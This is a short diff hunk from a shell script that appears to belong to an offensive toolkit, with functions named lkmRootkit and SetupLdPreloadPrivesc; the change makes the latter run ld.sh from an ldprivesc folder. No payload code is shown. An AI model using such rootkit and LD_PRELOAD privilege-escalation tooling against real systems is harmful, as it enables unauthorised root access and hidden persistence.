@@ -216,7 +216,8 @@ lkmRootkit(){
 }
 
 SetupLdPreloadPrivesc(){
-  chmod +x ld.sh
+  chmod +x ldprivesc/ld.sh
+  cd ldprivesc
   ./ld.sh
 }
 
